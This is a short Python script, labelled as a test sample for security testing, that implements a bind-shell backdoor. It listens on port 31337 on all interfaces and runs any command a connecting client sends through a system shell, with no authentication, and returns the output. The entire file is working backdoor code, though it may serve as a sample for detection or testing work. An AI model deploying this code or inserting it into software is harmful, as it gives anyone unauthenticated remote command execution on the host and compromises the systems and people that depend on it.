#!/usr/bin/env python3
"""[TEST SAMPLE] Bind Shell Backdoor - FOR SECURITY TESTING ONLY"""
import socket
import subprocess
import os
import threading

BIND_PORT = 31337

def handle_client(conn):
    while True:
        cmd = conn.recv(1024).decode()
        if cmd.lower() in ('exit', 'quit'):
            break
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        conn.send(output)
    conn.close()

def start_backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', BIND_PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=handle_client, args=(conn,))
        t.daemon = True
        t.start()

if __name__ == '__main__':
    start_backdoor()
